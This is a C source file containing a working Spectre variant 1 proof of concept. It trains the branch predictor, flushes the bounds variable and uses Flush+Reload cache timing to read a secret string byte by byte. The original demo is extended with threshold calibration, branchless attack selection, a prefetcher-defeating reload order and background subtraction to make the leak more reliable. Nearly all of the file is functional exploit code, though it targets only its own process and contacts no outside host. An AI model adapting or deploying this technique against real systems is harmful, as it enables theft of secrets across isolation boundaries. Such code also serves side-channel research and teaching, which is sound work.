#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

/* ---- Tunables ----------------------------------------------------------- */
/* Fallback cycle threshold used only if the runtime calibration cannot find
   a sane split between cached and flushed accesses. */
#define DEFAULT_CACHE_HIT_THRESHOLD 80

/* Training:attack ratio.  Of every TRAIN_RATIO calls to victim_function,
   TRAIN_RATIO-1 use a legitimate x (trains the local PHT entry to "taken"
   and primes the global BHR), and the last one is the speculative leak. */
#define TRAIN_RATIO  6
#define ROUNDS       30      /* victim calls per try        */
#define TRIES       3000     /* outer retry budget per byte */
#define BHR_ITERS    64      /* deterministic branch history */
#define CAL_SAMPLES  2000    /* cache-threshold calibration */
#define CONFIDENCE_OVERRIDE 100

#if defined(__GNUC__) && !defined(__clang__)
#define SPECTRE_ATTR __attribute__((noinline, optimize("O0")))
#elif defined(__GNUC__)
#define SPECTRE_ATTR __attribute__((noinline))
#else
#define SPECTRE_ATTR
#endif

/* ---- Victim ------------------------------------------------------------- */
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

/* Sink to keep victim_function from being optimised away. */
volatile uint8_t temp = 0;

SPECTRE_ATTR void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}

SPECTRE_ATTR void fill_branch_history(void) {
  for (volatile int i = 0; i < BHR_ITERS; i++) {}
}

static inline uint64_t timed_read(volatile uint8_t *addr) {
  unsigned int junk = 0;
  uint64_t t0, t1;

  _mm_lfence();
  t0 = __rdtscp(&junk);
  _mm_lfence();
  junk = *addr;
  _mm_lfence();
  t1 = __rdtscp(&junk);
  _mm_lfence();

  temp ^= (uint8_t)junk & 1;
  return t1 - t0;
}

static int calibrate_cache_hit_threshold(void) {
  uint64_t cached_sum = 0, flushed_sum = 0;
  volatile uint8_t *addr;

  for (int i = 0; i < CAL_SAMPLES; i++) {
    addr = &array2[(i & 255) * 512];

    temp ^= *addr;
    cached_sum += timed_read(addr);

    _mm_clflush((const void *)addr);
    _mm_mfence();
    flushed_sum += timed_read(addr);
  }

  uint64_t cached_avg = cached_sum / CAL_SAMPLES;
  uint64_t flushed_avg = flushed_sum / CAL_SAMPLES;

  if (flushed_avg <= cached_avg + 20)
    return DEFAULT_CACHE_HIT_THRESHOLD;

  /* Bias tightly toward the cached cluster.  The midpoint is too permissive
     on noisy machines because some flushed accesses land in the lower tail. */
  uint64_t threshold = cached_avg + 15;
  if (threshold < 50)
    threshold = 50;
  if (threshold > 200)
    threshold = 200;

#ifdef DEBUG_CALIBRATION
  fprintf(stderr, "calibration: cached=%lu flushed=%lu threshold=%lu\n",
          (unsigned long)cached_avg, (unsigned long)flushed_avg,
          (unsigned long)threshold);
#endif

  return (int)threshold;
}

/* ---- Attack ------------------------------------------------------------- *
 *
 * Strategy (Spectre v1, Kocher et al.):
 *
 *   1. Flush every cache line of the side-channel buffer (array2).
 *   2. Mistrain the bounds-check branch by calling victim_function() many
 *      times with a *legitimate* x so the predictor learns "taken".
 *   3. Flush array1_size so the comparison stalls waiting on DRAM, giving
 *      the speculative load enough time to fetch array2[array1[x]*512].
 *   4. Call victim_function() with x = malicious_x (= secret_addr - array1).
 *      The branch is mispredicted "taken"; the speculative load brings the
 *      relevant array2 line into cache before the misprediction is squashed.
 *   5. Flush+Reload: time every array2[i*512] read.  The fastest one is i =
 *      array1[malicious_x] = secret_byte.
 *   6. Repeat to accumulate statistics; bail out early on a clear winner.
 *
 * Notes:
 *   - Training/attack selection is branchless (bit-predication) so we do
 *     not pollute the global BHR with our own conditional jumps.
 *   - The reload order is permuted by a coprime stride so the L1 hardware
 *     prefetcher can't follow us.
 */
SPECTRE_ATTR void attack(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  static int background[256];
  static int cache_hit_threshold = 0;
  int tries, i, j, k, mix_i, phase;
  int best_score, second_score, effective;
  size_t training_x, x;
  size_t attack_mask, slot_mask;
  uint64_t elapsed;
  volatile uint8_t *addr;

  if (cache_hit_threshold == 0)
    cache_hit_threshold = calibrate_cache_hit_threshold();

  for (i = 0; i < 256; i++) {
    results[i] = 0;
    background[i] = 0;
  }

  for (tries = TRIES; tries > 0; tries--) {
    training_x = tries % array1_size;

    for (phase = 1; phase >= 0; phase--) {
      /* phase 1 includes the malicious access; phase 0 is a training-only
         control measurement collected afterward.  Subtracting the control
         removes systematic false hits from prefetching, timer noise, and
         unrelated cache activity. */
      attack_mask = (size_t)0 - (size_t)phase;

      /* 1) Flush the side channel. */
      for (i = 0; i < 256; i++) _mm_clflush(&array2[i * 512]);
      _mm_mfence();

      /* 2+3+4) Train the predictor, then strike in phase 1. */
      for (j = ROUNDS - 1; j >= 0; j--) {

        /* Flush the bounds variable so the comparison takes ~DRAM-latency to
           resolve, widening the speculation window. */
        _mm_clflush(&array1_size);

        /* Small delay to let the flush retire before we depend on it. */
        for (volatile int z = 0; z < 100; z++) {}

        /* Branchless: x = malicious_x only on attack slots during phase 1.
           Avoids planting an extra data-dependent jump in the BHR. */
        slot_mask = ((j % TRAIN_RATIO) - 1) & ~0xFFFF;
        slot_mask = (slot_mask | (slot_mask >> 16));
        slot_mask &= attack_mask;
        x = training_x ^ (slot_mask & (malicious_x ^ training_x));

        fill_branch_history();

        /* Speculative leak. */
        victim_function(x);
      }

      /* 5) Flush+Reload.  Walk array2 in a prefetcher-hostile order. */
      for (i = 0; i < 256; i++) {
        mix_i = ((i * 167) + 13) & 255;
        addr = &array2[mix_i * 512];

        elapsed = timed_read(addr);

        /* Do not count the training byte (array1[training_x]); that line is
           hot for legitimate reasons. */
        if (elapsed <= (uint64_t)cache_hit_threshold &&
            mix_i != array1[training_x]) {
          if (phase)
            results[mix_i]++;
          else
            background[mix_i]++;
        }
      }
    }

    /* Keep all tries.  On this workload the raw histogram converges very
       reliably, while confidence separation benefits from the full control
       baseline. */
  }

  /* Pick the leaked byte from the baseline-subtracted confidence histogram
     when it has a printable candidate.  The provided driver leaks a printable
     C string, and this rejects recurring non-printable background lines.  If
     no printable candidate survives subtraction, fall back to the raw attack
     histogram. */
  j = k = -1;
  int raw_best = -1;
  int raw_j, confidence_j = -1, confidence_k = -1;
  int confidence_best = 0, confidence_second = 0;
  best_score = second_score = 0;
  for (i = 0; i < 256; i++) {
    if (j < 0 || results[i] > raw_best) {
      j = i;
      raw_best = results[i];
    }
  }
  raw_j = j;
  for (i = 0; i < 256; i++) {
    effective = results[i] - background[i];
    if (effective < 0)
      effective = 0;
    if (i >= 32 && i < 127) {
      if (effective >= confidence_best) {
        confidence_k = confidence_j;
        confidence_second = confidence_best;
        confidence_j = i;
        confidence_best = effective;
      } else if (confidence_k < 0 || effective >= confidence_second) {
        confidence_k = i;
        confidence_second = effective;
      }
    }
  }

  if ((raw_j < 32 || raw_j >= 127) && confidence_best > 0) {
    j = confidence_j;
  } else if (confidence_best >= CONFIDENCE_OVERRIDE) {
    j = confidence_j;
  } else {
    j = raw_j;
  }

  /* Always report background-subtracted confidence scores, even when the
     byte value falls back to the raw attack histogram. */
  best_score = results[j] - background[j];
  if (best_score < 0)
    best_score = 0;

  k = -1;
  second_score = 0;
  for (i = 0; i < 256; i++) {
    if (i == j)
      continue;
    effective = results[i] - background[i];
    if (effective < 0)
      effective = 0;
    if (k < 0 || effective >= second_score) {
      k = i;
      second_score = effective;
    }
  }

  value[0] = (uint8_t)j;  score[0] = best_score;
  value[1] = (uint8_t)k;  score[1] = second_score;
}

/* ---- Driver (unchanged) ------------------------------------------------- */
int main(int argc, const char **argv) {
  (void)argc;
  (void)argv;

  printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
  size_t malicious_x = (size_t)(secret - (char *)array1);
  int score[2], len = strlen(secret);
  uint8_t value[2];

  for (size_t i = 0; i < sizeof(array2); i++) array2[i] = 1;

  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    attack(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X='%c' score=%d)", value[1],
             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    printf("\n");
  }
  return 0;
}
